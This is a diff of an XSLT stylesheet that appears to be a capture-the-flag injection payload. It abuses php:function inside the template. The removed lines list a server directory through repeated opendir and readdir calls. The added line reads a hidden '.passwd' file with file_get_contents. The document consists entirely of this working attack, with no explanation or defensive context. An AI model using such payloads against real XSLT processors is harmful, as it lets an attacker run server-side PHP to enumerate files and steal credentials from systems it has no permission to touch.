@@ -8,34 +8,7 @@
 <xsl:value-of select="price"/>
 </div><div style="margin-left:20px;margin-bottom:1em;font-size:10pt">    <p>
 <xsl:value-of select="php:function('opendir','.')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
-<br />
-<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
 <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
     </p>
   </div>
